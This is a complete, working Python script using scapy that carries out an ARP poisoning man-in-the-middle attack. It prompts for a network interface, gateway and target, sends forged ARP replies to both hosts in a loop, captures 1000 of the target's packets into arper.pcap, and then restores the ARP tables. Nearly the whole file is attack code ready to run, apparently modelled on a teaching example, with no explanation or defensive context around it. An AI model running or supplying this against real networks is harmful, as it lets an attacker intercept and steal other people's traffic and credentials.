from scapy.all import *
import sys
import threading

interface = input("Enter Interface: ")
tgt_gateway = input("Enter Target Gateway: ")
tgt_ip = input("Enter Target IP: ")
packet_count = 1000
poisoning = True

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
	print("[*] Restoring Target...")
	send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=gateway_mac),count=5)
	send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)

def get_mac(ip_address):
	responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address),timeout=2,retry=10)
	for s, r in responses:
		return r[Ether].src
	return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
	global poisoning
	poison_tgt = ARP()
	poison_tgt.op = 2
	poison_tgt.psrc = gateway_ip
	poison_tgt.pdst = target_ip
	poison_tgt.hwdst = target_mac
	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.pdst = gateway_ip
	poison_gateway.hwdst = gateway_mac
	print("[*] Beginning the ARP Poison [CTRL-C to stop]")
	while poisoning:
		send(poison_tgt)
		send(poison_gateway)
		time.sleep(2)
	print("[*] ARP Poison Attack Finished.")
	return

conf.iface = interface
conf.verb = 0
print("[*] Setting Up %s" % interface)
tgt_gateway_mac = get_mac(tgt_gateway)
if tgt_gateway_mac is None:
	print("[!!!] Failed to Get Gateway MAC, Exiting...")
	sys.exit(0)
else:
	print("[*] Gateway %s is at %s" % (tgt_gateway, tgt_gateway_mac))

tgt_mac = get_mac(tgt_ip)
if tgt_mac is None:
	print("[!!!] Failed to Get Target MAC, Exiting...")
	sys.exit(0)
else:
	print("[*] Target %s is at %s" % (tgt_ip, tgt_mac))

poison_thread = threading.Thread(target=poison_target,args=(tgt_gateway,tgt_gateway_mac,tgt_ip,tgt_mac))
poison_thread.start()
try:
	print("[*] Starting Sniffer for %d Packets" % packet_count)
	bpf_filter = "ip host %s" % tgt_ip
	packets = sniff(count=packet_count,filter=bpf_filter,iface=interface)
	print("\n[*] Writing Packets to arper.pcap")
	wrpcap('arper.pcap', packets)
	
except KeyboardInterrupt:
	pass

finally:
	poisoning = False
	time.sleep(2)
	restore_target(tgt_gateway,tgt_gateway_mac,tgt_ip,tgt_mac)
	sys.exit(0)
